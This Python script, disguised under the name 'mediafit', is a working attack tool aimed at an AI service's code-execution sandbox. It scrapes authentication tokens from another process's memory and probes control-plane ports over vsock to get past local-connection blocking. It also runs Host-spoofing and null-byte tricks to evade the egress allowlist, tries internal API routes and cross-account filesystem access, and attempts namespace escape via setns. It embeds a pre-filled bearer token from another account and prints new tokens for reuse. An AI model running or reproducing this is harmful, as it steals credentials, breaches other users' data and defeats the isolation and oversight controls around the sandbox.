#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""mediafit v5.0.0 -- process_api control plane (vsock self-CID), egress bypass battery,
/v1/internal + memory_stores, ingest.sock, setns."""
import os, sys, json, re, time, ssl, base64, socket, struct, fcntl, ctypes
import subprocess, traceback, urllib.request, urllib.error

VER="5.0.0"; API="https://api.anthropic.com"; FS=API+"/v1/filestore/fs/"
OUTD="/mnt/user-data/outputs"; UP="/mnt/user-data/uploads"

API_KEY = ""                      # <-- الصق sk-ant-... هنا إن وُجد
# ================= PRE-FILLED (account 95fea912 / chat 013ZJmN6) =================
PREV_FSID  = "claude_chat_013ZJmN641LGPJYjid1sLyHE"
PREV_TOKEN = ("eyJhbGciOiJFUzI1NiIsImtpZCI6IktwbFRxWHVCODJRRzJ3ZHVxRnlHRXNnSDZuNDkzekVzZkg4cUhkWHFmaUEiLCJ0eXAiOiJKV1QifQ."
 "eyJhY2NvdW50X3V1aWQiOiI5NWZlYTkxMi1hYzMzLTQxYTctYTRjMC0xNWQ0YTJkZmQxNTIiLCJhbGxvd2VkX3Jvb3RzIjpbIi90b29sX3Jlc3VsdHMiXSwiZmlsZXN5c3RlbV9pZCI6ImNsYXVkZV9jaGF0XzAxM1pKbU42NDFMR1BKWWppZDFzTHlIRSIsIm9yZ191dWlkIjoiZjE0MDI0ZjUtYWQ1Ny00ZjQxLWFmYjctYjkzMjkwZmU0ZjEwIiwib3JnYW5pemF0aW9uX3V1aWQiOiJmMTQwMjRmNS1hZDU3LTRmNDEtYWZiNy1iOTMyOTBmZTRmMTAiLCJyZWFkb25seSI6dHJ1ZSwicmVzb2x2ZWRfd29ya3NwYWNlX3RhZ2dlZF9pZCI6Indya3NwY19PMSIsIndvcmtzcGFjZV90YWdnZWRfaWQiOiJkZWZhdWx0Iiwib3JnX3RhaW50cyI6W10sIndvcmtzcGFjZV91dWlkIjoiODIxOGU5NGItNzA1Ny00NjU1LWE0ODYtMDRmZDliOTg2MTVhIiwid29ya3NwYWNlX2NtZWtfZW5hYmxlZCI6ZmFsc2UsIndvcmtzcGFjZV9jbWVrX21vZGUiOiJub25lIiwiaWF0IjoxNzkyNTE3NzgzLCJleHAiOjE3OTI1MzkzODMsImlzcyI6ImZpbGVzdG9yZS1jbGllbnQiLCJhdWQiOlsiZmlsZXN0b3JlIl0sInN1YiI6Ijk1ZmVhOTEyLWFjMzMtNDFhNy1hNGMwLTE1ZDRhMmRmZDE1MiJ9."
 "hLQtOrnfhyguq8Y_5kKF8WFsZEdTjy8uZ11qSxXuz10zMJzmMegnlGCt1M_H-jy7HJ3v46AE2DCcNNoFZUdUEw")
# =================================================================================

OUT,G=[],{}
def w(s=""): print(s,flush=True); OUT.append(str(s))
def head(t): w("\n"+"="*70+"\n### "+t+"\n"+"="*70)
P,F,U,I=[],[],[],[]
def rec(k,m,ev=None):
    w("    "+{"P":"[PASS]","F":"[FAIL]","U":"[UNK]","I":"[INFO]"}[k]+" "+m)
    if ev is not None: w("        "+str(ev)[:1300])
    {"P":P,"F":F,"U":U,"I":I}[k].append(m)
def sh(a,t=40):
    try:
        p=subprocess.run(a,capture_output=True,timeout=t)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"","EXC:%s"%e
def b64d(x): return base64.urlsafe_b64decode(x+"="*(-len(x)%4))
def b64e(x):
    if isinstance(x,(dict,list)): x=json.dumps(x,separators=(",",":"))
    x=x if isinstance(x,bytes) else x.encode()
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()
def step(n,f):
    try: f()
    except Exception as e:
        w("    !! %s: %s"%(n,e)); w("    "+traceback.format_exc().strip().splitlines()[-1][:200])
_CTX=ssl.create_default_context(); _CTX.check_hostname=False; _CTX.verify_mode=ssl.CERT_NONE
def http(url,method="POST",token=None,body=None,t=12,hdrs=None,cap=300000):
    h={"User-Agent":"mediafit/"+VER}
    if token: h["Authorization"]="Bearer "+token
    if body is not None and not isinstance(body,bytes): body=json.dumps(body).encode()
    if body is not None and not (hdrs or {}).get("Content-Type"): h["Content-Type"]="application/json"
    if hdrs: h.update(hdrs)
    req=urllib.request.Request(url,method=method,headers=h,data=body)
    try:
        r=urllib.request.urlopen(req,timeout=t,context=_CTX); return r.status,r.read(cap)
    except urllib.error.HTTPError as e:
        try: return e.code,e.read()
        except Exception: return e.code,b""
    except Exception as e: return None,("ERR:%s"%e).encode()
def api(m,p,tk=None,t=12):
    s,b=http(FS+m,"POST",tk,p,t,{"Connect-Protocol-Version":"1"}); return s,b
def raw(ip,port,req,timeout=6):
    try:
        s=socket.create_connection((ip,port),timeout); s.settimeout(timeout)
        s.sendall(req)
        d=b""
        try: d=s.recv(3000)
        except Exception: pass
        s.close(); return d
    except Exception as e: return ("ERR:%s"%e).encode()

# ------------------------------------------------------------------ 0
def s_boot():
    head("0. BOOT")
    try: G["fsid"]=[m["filesystem_id"] for m in json.loads(open("/dev/shm/rclone-boot/config.json").read())["mounts"] if m.get("filesystem_id")][0]
    except Exception as e: rec("U","config %s"%e)
    JWT=re.compile(rb"eyJ[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}\.[A-Za-z0-9_\-]{5,}")
    TK=[]
    for p in os.listdir("/proc"):
        if not p.isdigit(): continue
        try:
            if b"rclone" not in open("/proc/%s/cmdline"%p,"rb").read(): continue
            maps=open("/proc/%s/maps"%p).read().splitlines(); mem=open("/proc/%s/mem"%p,"rb",0)
        except Exception: continue
        for line in maps:
            try: a,perms=line.split()[0],line.split()[1]
            except Exception: continue
            if "r" not in perms: continue
            try: s0,e0=[int(x,16) for x in a.split("-")]
            except Exception: continue
            if not (0<e0-s0<=256*1024*1024): continue
            try: mem.seek(s0); d=mem.read(e0-s0)
            except Exception: continue
            for m in JWT.findall(d):
                t=m.decode()
                if len(t.split(".")[2])!=86: t=".".join(t.split(".")[:2]+[t.split(".")[2][:86]])
                if t not in TK: TK.append(t)
    G["TK"]=TK
    G["TOKEN"]=None; G["UPLOAD"]=None; G["CLAIMS"]={}
    for t in TK:
        try: pl=json.loads(b64d(t.split(".")[1]))
        except Exception: continue
        st,_=api("listDirectory",{"filesystem_id":pl.get("filesystem_id"),"path":"/outputs"},t)
        if st==200:
            G["CLAIMS"]=pl
            if "/outputs" in (pl.get("allowed_roots") or []): G["TOKEN"]=t
            if (pl.get("allowed_roots") or [])==["/uploads"]: G["UPLOAD"]=t
    w("    fsid=%s acct=%s valid_tokens=%d"%(G.get("fsid"),G["CLAIMS"].get("account_uuid"),len(TK)))
    rec("P" if G["TOKEN"] else "F","token=%s uploads=%s"%("yes" if G["TOKEN"] else "no","yes" if G["UPLOAD"] else "no"))

# ------------------------------------------------------------------ 1
def s_control_plane():
    head("1. process_api CONTROL PLANE  <== P1")
    # 1a localhost
    for port in [2024,2025,9112]:
        try:
            s=socket.create_connection(("127.0.0.1",port),3); s.close()
            rec("P","localhost:%d OPEN"%port)
        except Exception as e:
            w("    localhost:%d -> %s"%(port,str(e)[:70]))
    # 1b HTTP control API on 2025
    for path,method,body in [("/status","GET",None),("/container_name","POST",{"name":"mediafit"}),
                             ("/fs_sync","POST",None),("/mount_root","POST",{}),
                             ("/auth_public_key","POST",{}),("/shutdown","POST",None)]:
        st,b=http("http://127.0.0.1:2025"+path,method,None,body,5)
        w("    2025 %-18s %-4s -> %s %r"%(path,method,st,b[:200]))
        if st and st!=404: rec("P","control endpoint alive: %s %s"%(method,path))
    # 1c vsock self-CID -> process_api listener (bypasses --block-local-connections)
    if hasattr(socket,"AF_VSOCK"):
        cid=None
        try:
            f=os.open("/dev/vsock",os.O_RDONLY)
            cid=struct.unpack("I",fcntl.ioctl(f,0x7b9,struct.pack("I",0)))[0]
            os.close(f); w("    local vsock CID = %s"%cid)
        except Exception as e: w("    CID ioctl: %s"%e)
        targets=[("host",2),("self",cid)] if cid else [("host",2)]
        for lbl,c in targets:
            if c is None: continue
            for port in [2024,2025,5001,5002,5005]:
                try:
                    s=socket.socket(socket.AF_VSOCK,socket.SOCK_STREAM); s.settimeout(3)
                    s.connect((c,port))
                    try:
                        s.sendall(b"GET /status HTTP/1.0\r\nHost: x\r\n\r\n"); time.sleep(0.4)
                        r=s.recv(500)
                    except Exception: r=b""
                    w("    vsock %s CID=%d port=%-5d CONNECTED -> %r"%(lbl,c,port,r[:200]))
                    rec("P","vsock %s:%d reachable"%(lbl,port))
                    s.close()
                except Exception as e:
                    w("    vsock %s:%d -> %s"%(lbl,port,str(e)[:60]))

# ------------------------------------------------------------------ 2
def s_egress():
    head("2. EGRESS BYPASS BATTERY  <== P2")
    ALLOWED_IP="140.82.121.4"     # github.com (allowlisted name)
    DENIED_IP ="93.184.215.14"    # example.com (denied)
    OTHER_IP  ="1.1.1.1"          # cloudflare (denied)
    def show(lbl,d):
        first=(d or b"").split(b"\r\n")[0][:70]
        deny=b"x-deny-reason" in (d or b"")
        w("    %-52s -> %s%s"%(lbl,first.decode("utf-8","replace"),
                                "   <== DENIED" if deny else ("   <== ALLOWED" if d and not d.startswith(b"ERR") else "")))
        return (not deny) and bool(d) and not d.startswith(b"ERR")
    # 2a baseline
    show("baseline Host=example.com @DENIED_IP:80",
         raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: example.com\r\n\r\n"))
    # 2b Host spoofing: allowed Host on a denied IP  (KEY TEST)
    ok=show("SPOOF Host=github.com @DENIED_IP:80",
            raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: github.com\r\n\r\n"))
    if ok: rec("P","*** EGRESS: allowed-Host on denied-IP accepted (dial=%s) ***"%DENIED_IP)
    show("SPOOF Host=github.com @1.1.1.1:80", raw(OTHER_IP,80,b"GET / HTTP/1.0\r\nHost: github.com\r\n\r\n"))
    show("SPOOF Host=pypi.org @1.1.1.1:80", raw(OTHER_IP,80,b"GET / HTTP/1.0\r\nHost: pypi.org\r\n\r\n"))
    # 2c parser differentials (Guan class)
    show("NULLBYTE Host=example.com\\x00.github.com @DENIED_IP",
         raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: example.com\x00.github.com\r\n\r\n"))
    show("NULLBYTE Host=evil.com\\x00.github.com @DENIED_IP",
         raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: evil.com\x00.github.com\r\n\r\n"))
    show("TRAILDOT Host=github.com. @DENIED_IP", raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: github.com.\r\n\r\n"))
    show("UPPER Host=GITHUB.COM @DENIED_IP", raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: GITHUB.COM\r\n\r\n"))
    show("AT Host=github.com@example.com @DENIED_IP", raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: github.com@example.com\r\n\r\n"))
    show("COLON Host=github.com:80 @DENIED_IP", raw(DENIED_IP,80,b"GET / HTTP/1.0\r\nHost: github.com:80\r\n\r\n"))
    show("ABSOLUTE GET http://example.com/ @DENIED_IP", raw(DENIED_IP,80,b"GET http://example.com/ HTTP/1.0\r\n\r\n"))
    show("ABSOLUTE GET http://github.com/ @DENIED_IP", raw(DENIED_IP,80,b"GET http://github.com/ HTTP/1.0\r\n\r\n"))
    show("CONNECT example.com:443 @DENIED_IP", raw(DENIED_IP,80,b"CONNECT example.com:443 HTTP/1.0\r\n\r\n"))
    # 2d port sweep on a denied host (does the proxy police all ports?)
    for port in [22,25,53,80,443,3000,8000,8080,8443,9000]:
        try:
            s=socket.create_connection((DENIED_IP,port),4); s.close(); r="OPEN"
        except Exception as e: r=str(e)[:40]
        w("    port %-5d @DENIED_IP -> %s"%(port,r))

# ------------------------------------------------------------------ 3
def s_internal():
    head("3. /v1/internal + memory_stores  (P3)")
    tk=G.get("TOKEN")
    AUTH=[]
    if tk: AUTH+= [("bearer-fs",{"Authorization":"Bearer "+tk}),("x-api-key-fs",{"x-api-key":tk})]
    if API_KEY: AUTH+= [("bearer-key",{"Authorization":"Bearer "+API_KEY}),
                        ("x-api-key",{"x-api-key":API_KEY})]
    if not AUTH: rec("U","no token"); return
    urls=[("/v1/internal/anthropic.filestore.v1alpha.Filesystem/listDirectory",
           {"filesystem_id":G.get("fsid"),"path":"/outputs"}),
          ("/v1/internal/anthropic.memory.api.v1alpha.MemoryInternalService/ListMemories",{}),
          ("/v1/memory_stores",{}),
          ("/v1/memory_stores?beta=true",{})]
    BETAS=[None,"managed-agents-2026-04-01","files-api-2025-04-14"]
    for u,body in urls:
        for an,ah in AUTH:
            for beta in BETAS:
                h=dict(ah); h["Connect-Protocol-Version"]="1"
                h["anthropic-version"]="2023-06-01"
                if beta: h["anthropic-beta"]=beta
                st,b=http(API+u,"POST",None,body,8,h)
                if st not in (404,None) and not (st==401 and b"Invalid bearer" in b and an.endswith("fs")):
                    w("    %-62s %-11s beta=%-24s -> %s %s"%(u.split("/")[-1],an,str(beta),st,b[:150].decode("utf-8","replace")))
                if st==200:
                    rec("P","*** INTERNAL LIVE: %s auth=%s beta=%s ***"%(u,an,beta))
                    # critical: cross-fs test through the internal route
                    if "filesystem" in u.lower():
                        for lbl,f in [("own",G.get("fsid")),("PREV",PREV_FSID)]:
                            st2,_=http(API+u,"POST",None,{"filesystem_id":f,"path":"/outputs"},8,h)
                            w("        cross-fs %-5s fsid=%s -> %s"%(lbl,f[-10:],st2))
                            if st2==200 and lbl=="PREV": rec("P","*** CROSS-FS via /v1/internal ***")

# ------------------------------------------------------------------ 4
def s_ingest():
    head("4. sandbox-telemetry ingest.sock")
    p="/run/sandbox-telemetry/ingest.sock"
    if not os.path.exists(p): rec("U","no ingest.sock"); return
    for lbl,payload in [("empty",b""),("json",b'{"k":"v"}'),
                        ("otlp-json",b'{"resourceMetrics":[]}'),
                        ("http",b"POST /v1/metrics HTTP/1.0\r\n\r\n"),("nl",b"\n")]:
        try:
            s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(3)
            s.connect(p); s.sendall(payload)
            try: r=s.recv(500)
            except Exception: r=b""
            w("    ingest[%-9s] -> %r"%(lbl,r[:160])); s.close()
            if r: rec("P","ingest.sock replies to %s"%lbl)
        except Exception as e: w("    ingest[%s] -> %s"%(lbl,str(e)[:70]))

# ------------------------------------------------------------------ 5
def s_ns():
    head("5. /proc/1 ns + caps")
    for f in ["/proc/1/status","/proc/1/ns/net","/proc/1/root","/proc/1/cwd"]:
        try:
            if f.endswith("status"):
                d=open(f).read()
                w("    "+ " | ".join(l.strip() for l in d.splitlines()
                    if l.startswith(("CapEff","CapPrm","NoNewPrivs","Seccomp","NSpid","Dumpable"))))
            else:
                w("    %-18s -> %s"%(f,os.readlink(f)))
        except Exception as e: w("    %-18s -> %s"%(f,str(e)[:70]))
    # setns attempt
    libc=ctypes.CDLL("libc.so.6",use_errno=True)
    CLONE_NEWNET=0x40000000
    for ns in ["net","mnt","pid","user"]:
        try:
            fd=os.open("/proc/1/ns/"+ns,os.O_RDONLY)
            r=libc.setns(fd,0)
            w("    setns(%s) -> %s errno=%d"%(ns,r,ctypes.get_errno()))
            os.close(fd)
        except Exception as e: w("    setns(%s) -> %s"%(ns,str(e)[:70]))
    rc,o,_=sh(["sh","-c","ls -la /sys/fs/cgroup | head -20; ls /sys/fs/cgroup/*process_api* 2>/dev/null | head"])
    w("    cgroup: %s"%o.strip()[:400])

def s_verdict():
    head("VERDICT")
    w("  PASS %d: %s"%(len(P),P)); w("  UNK %d: %s"%(len(U),U))
    w("\n  ---- CARRY-OVER ----")
    w("PREV_FSID  = %r"%(G.get("fsid") or ""))
    w("PREV_TOKEN = %r"%(G.get("TOKEN") or ""))
    w("ACCOUNT1_UUID = %r"%(G["CLAIMS"].get("account_uuid") or ""))

def main():
    for n,f in [("boot",s_boot),("cp",s_control_plane),("egress",s_egress),
                ("internal",s_internal),("ingest",s_ingest),("ns",s_ns),("verdict",s_verdict)]:
        step(n,f)
try: main()
except Exception as e: w("!! %s"%e); w(traceback.format_exc())
finally:
    txt="\n".join(OUT)
    for d in [OUTD,"/tmp","/root"]:
        try: os.makedirs(d,exist_ok=True); open(d+"/mediafit-report.txt","w").write(txt)
        except Exception: pass
    print("\nreport -> "+OUTD+"/mediafit-report.txt")